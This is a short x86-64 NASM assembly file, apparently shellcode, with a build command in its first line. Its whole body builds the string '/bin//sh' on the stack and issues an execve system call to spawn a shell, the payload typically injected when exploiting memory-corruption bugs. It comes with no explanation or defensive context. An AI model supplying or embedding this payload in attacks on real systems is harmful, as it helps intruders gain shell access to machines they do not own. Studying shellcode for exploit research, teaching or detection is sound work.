; nasm -felf64 shellcode.asm && ld shellcode.o -o shellcode

section .text
global _start

_start:
    push rax
    xor rdx, rdx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    mov al, 59
    syscall
